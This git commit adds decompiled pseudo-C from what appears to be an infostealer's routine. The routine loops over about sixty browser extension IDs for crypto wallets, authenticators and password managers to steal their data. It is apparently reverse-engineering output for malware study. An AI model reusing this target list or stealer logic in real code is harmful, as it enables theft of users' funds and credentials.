653276d4ddfa8d367d42fab3397902765d23fd1b
m4now4r <27551832+m4now4r@users.noreply.github.com>
2024-05-05 23:04:54 +0700

    Create vdr_steal_browser_wallet_extensions_wrap_v2.4.c

---
+++ some pseudo-code/vdr_steal_browser_wallet_extensions_wrap_v2.4.c
@@ -0,0 +1,82 @@
+// #STR: "Opera Wallet", "gojhcdgcpbpfigcaejpfhfegekdgiblk", "Tronium", "pnndplcbkakcplkjnolgbkdgjikjednm", "Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph", "Exodus Web3 Wallet", "aholpfdialjgjfhomihkjbmgjidlcdno", "Braavos", "jnlgamecbpmbajjfhmmmlhejkemejdma"
+void *__userpurge vdr_steal_browser_wallet_extensions_wrap@<eax>(const char *user_data@<eax>, const char *browser_name@<ebx>, vdr_steal_credential_t *cred_t, int a4)
+{
+  if ( a4 == 3 )
+    return vdr_steal_browser_wallet_extensions(browser_name, "Opera Wallet", "gojhcdgcpbpfigcaejpfhfegekdgiblk", user_data, cred_t, 1, 3, 0, 0, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_TronLink, str_ibnejdfjmmkpcnlpebklmnkoeoihofec, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_MetaMask, str_nkbihfbeogaeaoehlefnkodbefgpgknn, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_BinanceChainWallet, str_fhbohimaelbohpjbbldcngcnapndodjp, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Yoroi, str_ffnbelfdoeiohenkjibnmadjiehjhajb, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_NiftyWallet, str_jbdaocneiiinmjbjlgalhcelgbejmnid, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Coinbase, str_hnfanknocfeofbddgcijnmhnfnkdnaad, user_data, cred_t, 1, a4, 1, 0, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Guarda, str_hpglfhgfnhbgpjdenjgmdgoeiappafln, user_data, cred_t, 1, a4, 1, 0, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_JaxxLiberty, str_cjelfplplebdjjenllpjcblmjkfcffne, user_data, cred_t, 1, a4, 0, 0, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_iWallet, str_kncchdigobghenbbaddojjnnaogfppfj, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_MewCx, str_nlbmnnijcnlegkjjpcfjclmcfggfefdm, user_data, cred_t, 1, a4, 0, 1, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_RoninWallet, str_fnjhmkhhmkbjkkabndcnnogagogbneec, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_NeoLine, str_cphhlgmgameodnhkjdmkpanlelnlohao, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_CloverWallet, str_nhnkbkgjikgcigadomkphalanndcapjk, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_LiqualityWallet, str_kpfopkelmapcoipemfendmdcghnegimn, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Terra_Station, str_aiifbnbfobpmeekipheeijimdpnlpgpp, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Keplr, str_dmkamcknogkgcdfhhbddcghachkejeap, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Sollet, str_fhmfendgdocmcbmfikdcogofphimnkno, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_AuroWallet, str_cnmamaachppnkjgnildpdmkaakejnhae, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_PolymeshWallet, str_jojhfeoedkpkglbfimdfabpdfjaoolaf, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_ICONex, str_flpiciilemghbmfalicajoolhkkenfel, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Coin98, str_aeachknmefphepccionboohckonoeemg, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_EVER_Wallet, str_cgeeodpfagjceefieflmdfphplkenlfk, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_KardiaChain, str_pdadjkfkgcafgbceimcpbkalnfnepbnk, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(
+    browser_name,
+    str_Trezor_Password_Manager,
+    str_imloifkgjagghnncjkhggdhalmcnfklk,
+    user_data,
+    cred_t,
+    1,
+    a4,
+    1,
+    1,
+    1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Rabby, str_acmacodkjbdgmoleebolmdjonilkdbch, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Phantom, str_bfnaelmomeimhlpmgjnjophhpkkoljpa, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_MetaMask, str_ejbalbakoplchlghecdalmeeeajnimhm, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_BraveWallet, str_odbfpeeihdkbihmopkbjmoonfanlbfcl, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Oxygen__Atomic_, str_fhilaheimglignddkjgofkcbgekhenbh, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_PaliWallet, str_mgffkfbidihjpoaomajlbgchddlicgpn, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_BoltX, str_aodkkagnadcbobfpggfnjeongemjbjca, user_data, cred_t, 1, a4, 0, 0, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_XdefiWallet, str_hmeobnfnfcmdkdcmlblgagmfpfboieaf, user_data, cred_t, 1, a4, 0, 0, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_NamiWallet, str_lpfcbjknijpeeillifnkikgncikgfhdo, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_MaiarDeFiWallet, str_dngmlblcodfobpdpecaadgfbcggfjfnm, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_WavesKeeper, str_lpilbniiabackdjcionkobglmddfbcjo, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Solflare, str_bhhhlbepdkbapadjdnnojkbgioiodbic, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_CyanoWallet, str_dkdedlpgdmmkkfjabffeganieamfklkm, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_KHC, str_hcflpincpppdclinealmandijcmnkbgn, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_TezBox, str_mnfifefkajgofkcjkemidiaecocnkjeh, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Temple, str_ookjlbkiijinhpmnjffcofjonbfbgaoc, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Goby, str_jnkelfanjkeadonecabehalmbgpfodjm, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_RoninWalletEdge, str_kjmoohlgokccodicjjfebfomlbljgfhk, user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Authenticator, str_bhghoamapcdpbohphigoooaddinpkbai, user_data, cred_t, 0, a4, 1, 1, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, str_Authy, str_gaedmjdfmmahhbjefcbgaolhhanlaolb, user_data, cred_t, 0, a4, 1, 1, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_EOS_Authenticator, str_oeljdldpnmdbchonielidgobddffflal, user_data, cred_t, 0, a4, 1, 1, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, str_GAuth_Authenticator, str_ilgcnhelpchnceeipipijaljkblbcobl, user_data, cred_t, 0, a4, 1, 1, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, "Tronium", "pnndplcbkakcplkjnolgbkdgjikjednm", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Exodus Web3 Wallet", "aholpfdialjgjfhomihkjbmgjidlcdno", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Braavos", "jnlgamecbpmbajjfhmmmlhejkemejdma", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Enkrypt", "kkpllkodjeloidieedojogacfhpaihoh", user_data, cred_t, 1, a4, 1, 1, 1);
+  vdr_steal_browser_wallet_extensions(browser_name, "OKX Web3 Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Sender", "epapihdplajcdnnkdeiahlgigofloibg", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Hashpack", "gjagmgiddbbciopjhllkdnddhcglnemk", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Eternl", "kmhcihpebfmpgmihbkipmjlmmioameka", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "GeroWallet", "bgpipimickeadkjlklgciifhnalhdjhe", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Pontem Wallet", "phkbamefinggmakgklpkljjmgibohnba", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Petra Wallet", "ejjladinnckdgjemekebdpeokbikhfci", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Martian Wallet", "efbglgofoippbgcjepnhiblaibcnclgk", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Finnie", "cjmkndjhnagcfbpiemnkdpomccnjblmj", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Leap Terra", "aijcbedoijmgnlmjeegjaglmepbmpkpi", user_data, cred_t, 1, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Microsoft AutoFill", "fiedbfgcleddlbcmgdigjgdfcggjcion", user_data, cred_t, 0, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "Bitwarden", "nngceckbapebfimnlniiiahkandclblb", user_data, cred_t, 0, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "KeePass Tusk", "fmhmiaejopepamlcjkncpgpdjichnecm", user_data, cred_t, 0, a4, 1, 0, 0);
+  vdr_steal_browser_wallet_extensions(browser_name, "KeePassXC-Browser", "oboonakemofpalcgghocfoadofidjkkk", user_data, cred_t, 0, a4, 1, 0, 0);
+  return vdr_steal_browser_wallet_extensions(browser_name, "Bitwarden", "nngceckbapebfimnlniiiahkandclblb", user_data, cred_t, 0, a4, 1, 0, 0);
+}
